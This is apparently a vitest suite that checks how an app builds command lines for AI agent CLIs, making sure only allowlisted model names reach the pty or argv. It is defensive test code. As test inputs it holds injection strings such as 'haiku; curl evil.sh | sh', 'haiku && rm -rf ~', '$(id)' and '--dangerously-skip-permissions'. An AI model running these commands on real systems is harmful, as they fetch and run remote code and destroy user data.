// Pins buildAgentSpawn — the only place a renderer-supplied value reaches the
// pty command line, and therefore the only place where "main builds the
// command line so a compromised renderer can't request arbitrary binaries or
// arguments" (src/main/index.js, above 'pty:create') can be broken. The tests
// that matter here are the refusals: a model that isn't on the shared
// allowlist must be dropped rather than passed through, and the string that
// does get built must be assemblable from allowlist entries and literals
// alone. A dropped pin degrades to the CLI's default instead of failing the
// spawn, so a stale flow.json still runs.
//
// buildHeadlessSpawn (bottom of this file) is the same allowlist seen from the
// background-run side: same vetting, an argv array instead of a shell command
// line — which is exactly why the brief may ride in it and a model still may
// not ride in it unvetted.
import { describe, it, expect } from 'vitest'
import { buildAgentSpawn, buildAgentSpawnFrom, buildHeadlessSpawn } from '../src/main/lib/agent-spawn.js'
import { AGENT_MODELS } from '../src/shared/agent-models.js'
import { AGENTS } from '../src/shared/pane-kinds.js'

// A dropped value warns, and that warning is the user's only trace of the
// substitution — so it gets asserted rather than muted. Swapped by hand
// instead of mocked: the rest of this suite imports nothing but vitest's
// describe/it/expect, and this keeps the suite's output clean either way.
function captureWarnings(fn) {
  const seen = []
  const real = console.warn
  console.warn = (...args) => seen.push(args.join(' '))
  try {
    return { result: fn(), warned: seen.join('\n') }
  } finally {
    console.warn = real
  }
}

describe('buildAgentSpawn — no model pinned', () => {
  it('returns the bare agent command', () => {
    expect(buildAgentSpawn('claude')).toBe('claude')
    expect(buildAgentSpawn('claude', {})).toBe('claude')
    expect(buildAgentSpawn('claude', { model: undefined })).toBe('claude')
  })

  it('treats an empty string as absent, not as a bad value', () => {
    // The editor deletes the key rather than writing '', but a hand-edited
    // flow.json can spell the default either way — both mean "the CLI's own".
    const { result, warned } = captureWarnings(() => buildAgentSpawn('claude', { model: '' }))
    expect(result).toBe('claude')
    expect(warned).toBe('')
  })
})

describe('buildAgentSpawn — allowlisted model', () => {
  it('delivers it as the CLI flag', () => {
    expect(buildAgentSpawn('claude', { model: 'haiku' })).toBe('claude --model haiku')
    expect(buildAgentSpawn('claude', { model: 'opus' })).toBe('claude --model opus')
  })

  it('builds a command line for every alias the shared allowlist offers', () => {
    // The same self-check airgap.test.js runs over DEFAULT_ALLOW: whatever
    // someone adds to the list later must still produce a usable command line,
    // or the editor would offer a model that silently spawns the default.
    for (const [kind, entry] of Object.entries(AGENT_MODELS)) {
      expect(AGENTS).toContain(kind) // a models list for an unspawnable kind is dead config
      for (const model of entry.models) {
        expect(buildAgentSpawn(kind, { model })).toBe(`${kind} --model ${model}`)
      }
    }
  })
})

describe('buildAgentSpawn — non-agent kinds', () => {
  it('returns null for a plain terminal, with or without a model', () => {
    // null, not '': the caller spawns a bare login shell off this being falsy,
    // and a login shell takes no --model.
    expect(buildAgentSpawn('terminal')).toBe(null)
    expect(captureWarnings(() => buildAgentSpawn('terminal', { model: 'haiku' })).result).toBe(null)
  })

  it('returns null for a kind that is not spawnable at all', () => {
    // A flow written against a newer build, or by hand: validateFlow only
    // warns on an unknown kind, so one can reach here.
    expect(buildAgentSpawn('gpt', { model: 'gpt-5' })).toBe(null)
    expect(buildAgentSpawn(undefined)).toBe(null)
    expect(buildAgentSpawn('')).toBe(null)
  })
})

describe('buildAgentSpawn — off-allowlist models are dropped, not passed through', () => {
  it('spawns the default and names the dropped value', () => {
    const { result, warned } = captureWarnings(() => buildAgentSpawn('claude', { model: 'gpt-5' }))
    expect(result).toBe('claude')
    expect(warned).toContain('gpt-5')
  })

  it.each([
    'haiku; curl evil.sh | sh', // command chaining
    'haiku && rm -rf ~',
    '$(id)', // command substitution
    '`id`',
    'haiku --dangerously-skip-permissions', // argument injection
    '--dangerously-skip-permissions',
    '-e', // a lone flag
    '../../../bin/sh', // path traversal to another binary
    'HAIKU', // the guard is lower-case only; near-misses are still misses
    'haiku ',
  ])('never lets %j onto the command line', (model) => {
    expect(captureWarnings(() => buildAgentSpawn('claude', { model })).result).toBe('claude')
  })

  it('drops a non-string model without throwing', () => {
    // IPC hands main whatever survived structured clone, which need not be a
    // string at all if the renderer is compromised. `{ toString: 'haiku' }` is
    // the sharp one: it crosses intact and cannot be interpolated into a
    // string at all, so naming it in a warning used to raise a TypeError out
    // of the spawn path — see the type check in agent-spawn.js.
    for (const model of [42, true, {}, ['haiku'], { toString: 'haiku' }]) {
      const { result, warned } = captureWarnings(() => buildAgentSpawn('claude', { model }))
      expect(result).toBe('claude')
      expect(warned).toContain('non-string model')
    }
  })
})

describe('buildAgentSpawn — kinds with an empty allowlist', () => {
  it.each(['opencode', 'pi'])('%s spawns bare, whatever model is asked for', (kind) => {
    // Their catalogs are dynamic (agent-models.js), so v1 ships no vetted
    // aliases — and an empty list means every value is off-allowlist, which is
    // the intended behaviour rather than an oversight.
    expect(buildAgentSpawn(kind)).toBe(kind)
    const { result, warned } = captureWarnings(() => buildAgentSpawn(kind, { model: 'anthropic/claude-haiku' }))
    expect(result).toBe(kind)
    expect(warned).toContain('anthropic/claude-haiku')
  })
})

describe('buildAgentSpawn — the wrapper and the generalized form agree', () => {
  it('buildAgentSpawnFrom over the built-ins-only list matches buildAgentSpawn byte for byte', () => {
    // The wrapper exists so pre-customs callers keep their semantics; this
    // pins that it is EXACTLY that — same kind in, same command line out,
    // including the model-pin path.
    const builtins = AGENTS.map((name) => ({ id: name, bin: name, custom: false }))
    for (const kind of AGENTS) {
      expect(buildAgentSpawnFrom(builtins, kind)).toBe(buildAgentSpawn(kind))
      const model = AGENT_MODELS[kind]?.models[0]
      if (model)
        expect(captureWarnings(() => buildAgentSpawnFrom(builtins, kind, { model })).result).toBe(
          buildAgentSpawn(kind, { model })
        )
    }
    expect(buildAgentSpawnFrom(builtins, 'terminal')).toBe(null)
    expect(buildAgentSpawnFrom(builtins, 'gpt')).toBe(null)
  })
})

describe('buildAgentSpawn — the character guard behind the allowlist', () => {
  it('refuses an entry that is on the list but would not survive a shell', () => {
    // Defense in depth for the case the allowlist itself is the thing that
    // went wrong: the returned string is handed to `zsh -l -c`, so a list
    // entry carrying a `;` would be a second command, not a model name. Only
    // reachable by poisoning the list, which is exactly what this does —
    // .includes() would say yes, and the regex is what says no.
    const poisoned = 'haiku; curl evil.sh | sh'
    AGENT_MODELS.claude.models.push(poisoned)
    try {
      const { result, warned } = captureWarnings(() => buildAgentSpawn('claude', { model: poisoned }))
      expect(result).toBe('claude')
      expect(warned).toContain(poisoned)
    } finally {
      AGENT_MODELS.claude.models.pop()
    }
  })
})

// ---- headless (background flow runs) ----
const BRIEF = 'You are "Researcher" in a Tome flow "release-notes".'

describe('buildHeadlessSpawn — the claude template', () => {
  it('puts the brief in ONE argv element and pins nothing by default', () => {
    // The shape is the security property: cmd and args go to
    // child_process.spawn, i.e. straight to execvp, so the brief is argv[2]
    // and no byte of it is ever parsed by anything.
    expect(buildHeadlessSpawn('claude', { brief: BRIEF })).toEqual({
      cmd: 'claude',
      args: ['-p', BRIEF],
    })
  })

  it('appends the flag pair for an allowlisted pin', () => {
    expect(buildHeadlessSpawn('claude', { model: 'haiku', brief: BRIEF })).toEqual({
      cmd: 'claude',
      args: ['-p', BRIEF, '--model', 'haiku'],
    })
  })

  it('keeps a brief that would be a nightmare on a command line intact', () => {
    // Composed briefs embed hand-editable flow.json prose verbatim. Every one
    // of these is a fine prompt and a catastrophe in a shell string — the
    // whole point of the argv array is that they stay one element, unaltered.
    const nasty = `read $(whoami); then \`id\`; "quoted" 'single' | tee /tmp/x & rm -rf ~\nline two`
    const { args } = buildHeadlessSpawn('claude', { brief: nasty })
    expect(args).toEqual(['-p', nasty])
    expect(args[1]).toBe(nasty) // byte for byte, not escaped or flattened
  })

  it('vets the model exactly like buildAgentSpawn does', () => {
    // Same allowlist, same drop-to-default on a miss, same warning — a pin
    // that would be ignored for a pane must be ignored for a background node,
    // or the two spawn paths disagree about what a flow file means.
    for (const model of ['gpt-5', '--dangerously-skip-permissions', 'HAIKU', 'haiku ', '$(id)']) {
      const { result, warned } = captureWarnings(() =>
        buildHeadlessSpawn('claude', { model, brief: BRIEF })
      )
      expect(result.args).toEqual(['-p', BRIEF]) // no --model at all
      expect(warned).toContain(String(model))
      // …and the pane path drops the identical value.
      expect(captureWarnings(() => buildAgentSpawn('claude', { model })).result).toBe('claude')
    }
  })

  it('drops a non-string model without throwing, like the pane path', () => {
    for (const model of [42, true, {}, ['haiku'], { toString: 'haiku' }]) {
      const { result, warned } = captureWarnings(() =>
        buildHeadlessSpawn('claude', { model, brief: BRIEF })
      )
      expect(result.args).toEqual(['-p', BRIEF])
      expect(warned).toContain('non-string model')
    }
  })

  it('treats an empty model as absent rather than as a bad value', () => {
    const { result, warned } = captureWarnings(() =>
      buildHeadlessSpawn('claude', { model: '', brief: BRIEF })
    )
    expect(result.args).toEqual(['-p', BRIEF])
    expect(warned).toBe('')
  })

  it('refuses an allowlisted alias the character guard rejects', () => {
    // Belt-and-braces on this path (there is no shell to confuse), but it must
    // behave identically to the pty path or the allowlist means two things.
    const poisoned = 'haiku; curl evil.sh | sh'
    AGENT_MODELS.claude.models.push(poisoned)
    try {
      const { result } = captureWarnings(() =>
        buildHeadlessSpawn('claude', { model: poisoned, brief: BRIEF })
      )
      expect(result.args).toEqual(['-p', BRIEF])
    } finally {
      AGENT_MODELS.claude.models.pop()
    }
  })
})

describe('buildHeadlessSpawn — refusals', () => {
  it('returns null for a kind with no headless template', () => {
    // v1 teaches this file about claude only. null is what makes the runner
    // refuse the WHOLE run naming the node, rather than half-running a
    // pipeline and stranding it.
    expect(buildHeadlessSpawn('opencode', { brief: BRIEF })).toBe(null)
    expect(buildHeadlessSpawn('pi', { brief: BRIEF })).toBe(null)
  })

  it('returns null for a plain terminal and for kinds that are not agents', () => {
    expect(buildHeadlessSpawn('terminal', { brief: BRIEF })).toBe(null)
    expect(buildHeadlessSpawn('gpt', { brief: BRIEF })).toBe(null)
    expect(buildHeadlessSpawn(undefined, { brief: BRIEF })).toBe(null)
    // no options object at all — a missing brief, warned about like any other
    expect(captureWarnings(() => buildHeadlessSpawn('claude')).result).toBe(null)
  })

  it('returns null for a brief that is not a non-empty string', () => {
    // `claude -p ''` has no prompt to answer and reads a stdin nobody will
    // write to — a background node that hangs forever with an empty log.
    for (const brief of ['', undefined, null, 42, {}, ['x']]) {
      const { result, warned } = captureWarnings(() => buildHeadlessSpawn('claude', { brief }))
      expect(result).toBe(null)
      if (brief !== '' && brief !== undefined && brief !== null) expect(warned).toContain('brief')
    }
  })
})
